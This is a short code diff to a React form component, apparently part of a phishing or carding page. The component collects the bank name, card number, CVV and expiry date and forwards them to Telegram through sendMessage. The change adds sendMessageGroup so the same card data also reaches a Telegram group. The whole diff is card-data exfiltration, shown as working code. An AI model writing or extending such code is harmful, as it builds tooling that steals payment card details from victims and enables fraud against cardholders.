@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import './styles.css';
 import axios from 'axios';
-import { sendMessage } from '../api/telegram.ts';
+import { sendMessage, sendMessageGroup } from '../api/telegram.ts';
 import { useNavigate, useLocation } from 'react-router-dom';
 
 
@@ -34,7 +34,7 @@ const navigate = useNavigate();
         Bank Name: [${cardData.name}]
         Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
       `;
-
+      sendMessageGroup(message);
       sendMessage(message);
 
       // Сбрасываем данные формы
